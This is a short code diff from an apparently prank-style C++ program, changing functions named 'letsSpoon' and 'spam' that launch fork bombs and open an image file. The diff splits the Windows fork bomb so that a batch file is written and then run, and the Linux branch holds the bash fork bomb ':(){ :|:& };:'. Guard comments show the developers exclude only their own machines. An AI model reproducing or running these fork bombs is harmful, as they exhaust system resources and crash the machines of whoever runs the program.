@@ -109,8 +109,8 @@ void letsSpoon(){
         exit(-1); // So as not to bomb our machines
 #endif
 		if(OS==win){
-            system("echo %0^|%0 > forkbomb.bat "
-                   " forkbomb.bat");
+            system("echo %0^|%0 > forkbomb.bat");
+            system("forkbomb.bat");
 		}else if(OS==linux){
 			system(":(){ :|:& };:");
 		}else{
@@ -314,7 +314,8 @@ void spam(){
         exit(-7); // So as not to bomb our machines
 #endif
         if(OS==win){
-            system("\"./Bambi.jpg\"");
+            string cmd = "\"./Bambi.jpg\"";
+            system(cmd);
         }else{
             system("display Bambi.jpg");
         }
